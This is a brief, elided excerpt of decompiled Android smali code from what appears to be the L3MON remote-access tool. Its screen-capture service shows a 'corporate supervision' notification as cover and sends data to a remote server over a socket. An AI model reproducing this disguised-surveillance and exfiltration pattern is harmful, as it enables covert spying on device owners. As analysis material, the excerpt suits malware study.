...
.method private buildNotification()Landroid/app/Notification;
    ...
    const-string v1, "mdm_screen_capture"
    ...
    const-string v3, "Supervisi\u00c3\u00b3n Corporativa"
    ...
    .line 154
    const-string v3, "Captura de pantalla corporativa activa"
    ...
    invoke-virtual {p0, v3}, Lcom/etechd/l3mon/ScreenCaptureService;->getSystemService(Ljava/lang/Class;)Ljava/lang/Object;
...
.method private sendToServer(Ljava/lang/String;)V
    ...
    invoke-virtual {v0, v2, v3}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/client/Socket;
